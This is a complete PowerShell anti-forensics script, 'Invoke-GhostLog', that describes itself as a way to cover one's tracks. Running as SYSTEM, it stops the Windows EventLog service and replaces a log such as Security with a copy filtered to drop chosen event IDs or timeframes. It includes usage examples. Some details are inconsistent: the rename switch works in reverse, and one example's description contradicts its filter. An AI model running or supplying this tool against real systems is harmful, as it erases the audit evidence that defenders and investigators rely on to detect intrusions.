Function Invoke-GhostLog{

<#
.SYNOPSIS
    Replaces event log with defined included or excluded specific events either by event id or timeframe. This enables someone to cover their tracks or to determine tactics that 
    could be used to do so. 

    A good reference on building XML queries can be found in the notes section.
    
.PARAMETER log
    Specify an event log to alter

.PARAMETER out
    Specifiy the path to store the temporary event log

.PARAMETER filter
    Specify the XML filter to use, which will include events to include or exclude based on particular events or timeframe

.PARAMETER rename
    Takes no input, when set will rename the current log file by appending today's date to the name

.EXAMPLE
    Invoke-GhostLog -log security -filter "[System[(EventID!=4616)]]"

    Running Invoke-GhostLog on the Security log and excluding event id 4616.

.EXAMPLE
    Invoke-GhostLog -log security -filter "[System[(EventID=4624) and TimeCreated[@SystemTime<='2018-8-19T13:13:00.000Z']]]" -rename
    
    Running Invoke-GhostLog on the Security log and including event id 4624 after 2018-8-19. In addition, the original event log is renamed to "security-<todays's date>"

.NOTES
    https://blogs.technet.microsoft.com/heyscriptingguy/2014/06/06/understanding-xml-and-xpath/

#>



[CmdLetBinding()]
    Param(
        [Parameter(mandatory=$true)]
        [String]$log,

        [Parameter(mandatory=$true)]
        [string]$out,
    
        [Parameter(mandatory=$true)]
        [string]$filter,
        
        [Parameter()]
        [switch]$rename    
    )


@'
                   _.-,                   
              _ .-'  / .._                
           .-:'/ - - \:::::-.             
         .::: '  e e  ' '-::::.            
        ::::'(    ^    )_.::::::          
       ::::.' '.  o   '.::::'.'/_         .___                   __                      ________.__                    __  .____                      
   .  :::.'       -  .::::'_   _.:        |   | _______  ______ |  | __ ____            /  _____/|  |__   ____  _______/  |_|    |    ____   ____     
 .-''---' .'|      .::::'   '''::::       |   |/    \  \/ /  _ \|  |/ // __ \   ______ /   \  ___|  |  \ /  _ \/  ___/\   __\    |   /  _ \ / ___\    
'. ..-:::'  |    .::::'        ::::       |   |   |  \   (  <_> )    <\  ___/  /_____/ \    \_\  \   Y  (  <_> )___ \  |  | |    |__(  <_> ) /_/  >    
 '.' ::::    \ .::::'          ::::       |___|___|  /\_/ \____/|__|_ \\___  >          \______  /___|  /\____/____  > |__| |_______ \____/\___  /      
      ::::   .::::'           ::::                 \/                \/    \/                  \/     \/           \/               \/    /_____/      
       ::::.::::'._          ::::          
        ::::::' /  '-      .::::           
         '::::-/__    __.-::::'            
           '-::::::::::::::-'              
               '''::::'''                                                     
'@


# Export filtered log

$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
if($user -ne "NT AUTHORITY\SYSTEM")
    {
    Write-Host "Error: Script not being ran as System, try again" -ForegroundColor red
    break
    }
wevtutil epl $log "$out" "/q:*$filter"

try
    {
    Stop-service -Name eventlog -ErrorAction stop
    }
catch
    {
    write-host "Error: Couldn't stop the Event Log service" -ForegroundColor Red
    break
    }

if($rename -eq $false)
    {
    $date = Get-Date
    try
        {
        Rename-Item "C:\Windows\System32\winevt\Logs\$log" "C:\Windows\System32\winevt\Logs\$log-$date" -ErrorAction stop
        }
    catch
        {
        Write-Host "Error: Can't rename old log" -ForegroundColor red
        break
        }
    Move-item "$out" "C:\Windows\System32\winevt\Logs"
    }
else
    {
    try
        {
        Move-item "$out" "C:\Windows\System32\winevt\Logs" -Force
        }
    catch
        {
        Write-Host "Error: Can't replace old log" -ForegroundColor red
        }
    }

Start-Service -Name eventlog




}